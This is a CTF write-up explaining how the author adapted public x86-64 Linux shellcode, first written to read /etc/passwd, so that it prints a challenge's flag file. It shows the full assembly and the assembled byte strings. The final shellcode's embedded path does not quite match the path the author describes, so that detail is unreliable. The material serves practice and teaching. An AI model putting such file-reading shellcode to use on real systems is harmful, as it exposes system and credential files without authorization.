---
title: "FakeCTF - Shellcode 0x1"
date: 2022-06-18
draft: false
tags: [programming]
# image: "/image/blog-pic.jpg"
description: "A shellcoding programming (?) challenge"
showDate: true          # to enable/disable showing dates
math: true              # to enable showing equations (katex)
---

[Go back to write-ups list](../)

> **Category:** Prog
> 
> **Creator:** HømardBøy

## The challenge

When we connect to the challenge, we are prompted to send a linux x86-64 shellcode, with a maximum length of 96 bytes.

The description of the challenge also says we have to display the content of a file called "flag" located in the same folder as the binary.

So basically, what we should do in our shellcode is:

- push the file name in memory
- call the OPEN system call to get a handle to the file
- call the READ system call to read the content
- call the WRITE system call to display the result

But since I am a bit lazy, I know there are many shellcodes that can be found online and that would read a file (usually `/etc/passwd`)

So I found [this article](https://zerosum0x0.blogspot.com/2014/12/x64-linux-polymorphic-read-file.html) and chose its second shellcode (why not the first one? I don't know).

```as
_start:

filename:
    xor esi, esi
    mul esi

    push rdx    ; '\0'

    mov rcx, 0x6477737361702f63  ; 'c/passwd'
    push rcx

    mov rcx, 0x74652f2f2f2f2f2f  ; '//////et'
    push rcx

openfile:
    push rsp
    pop rdi

    mov al, 0x2
    syscall

readfile:
    push rax
    pop rdi

    push rsp
    pop rsi

    push rdx
    push rdx        ; saving lots of 0s
    push rdx
    push rdx
    pop rax
    mov dx, 0x999
    syscall

write:
    pop rdi
    inc edi

    push rax
    pop rdx
    pop rax
    inc eax
    syscall

leave:
    pop rax
    mov al, 60
    syscall
```

Once assembled, it gives the following shellcode:

```
1\xf6\xf7\xe6RH\xb9c/passwdQH\xb9//////etQT_\xb0\x02\x0f\x05P_T^RRRRXf\xba\x99\t\x0f\x05_\xff\xc7PZX\xff\xc0\x0f\x05X\xb0<\x0f\x05
```

We can see the file path split in the shellcode and I just wanted to replace it with the path to the file `flag`.

I found it interesting that the path used many `/` to make the string length a multiple of 8 bytes. But here, I needed to read a file in the local directory. So the path I chose was `.///////////flag`, and it worked!

Final shellcode:

```
1\xf6\xf7\xe6RH\xb9////flagQH\xb9./////etQT_\xb0\x02\x0f\x05P_T^RRRRXf\xba\x99\t\x0f\x05_\xff\xc7PZX\xff\xc0\x0f\x05X\xb0<\x0f\x05
```

> Note: I know I could probably only push one shorter string, like `.///flag` but in the middle of a CTF, it was just easier to copy the compiled shellcode and edit the path from there, instead of reassembling one.

[Go back to write-ups list](../)